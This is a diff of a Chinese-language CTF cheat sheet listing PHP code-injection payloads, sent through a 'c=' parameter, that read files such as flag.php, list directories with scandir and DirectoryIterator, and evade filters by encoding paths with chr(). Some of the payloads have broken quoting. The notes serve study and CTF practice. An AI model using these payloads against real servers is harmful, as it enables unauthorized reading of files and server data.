@@ -5,6 +5,7 @@ u在线php运行：<https://www.jyshare.com/compile/1/>
 ## **php常见特殊函数和绕过**
 **文件包含函数 绕过一些禁用函数**
 如果是$_POST，直接蚁剑连，用插件绕过
+```
 c=highlight_file("config.php");        //文件内容包含高亮。
 c=show_source('flag.php');
 c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
@@ -18,6 +19,22 @@ c=echo file_get_contents('flag.php');
 c=include('/flag.txt');
 c=require('/flag.txt');
 c=require_once('/flag.txt');
+```
+查目录
+```
+c=var_dump(scandir('/'));
+c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}//glob的作用是规定后面的匹配格式，查找匹配的文件路径模式
+
+c=$a=scandir("/");foreach($a as $key=>$value){echo $key."=>".$value;}
+```
+```
+print_r(file_get_contents(/flagg')); //打印获取文件的内容
+var_dump(scandir(/);  //查看根目录
+var_dump(scandir(chr(47))); //查看根目录
+
+var_dump(file_get_contents(/flagg')); //打印获取文件的内容。file_get_content()也可以读取php://filter伪协议。
+var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));  //绕过打印flag
+```
 
 
 ^
@@ -50,14 +67,6 @@ echo eval("echo 1;");
 ```
 
 ^
-print_r(file_get_contents(/flagg')); //打印获取文件的内容
-var_dump(scandir(/);  //查看根目录
-var_dump(scandir(chr(47))); //查看根目录
-
-var_dump(file_get_contents(/flagg')); //打印获取文件的内容。file_get_content()也可以读取php://filter伪协议。
-var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));  //绕过打印flag
-
-
 ^
 
 命令执行找flag文件：find / -name flag*
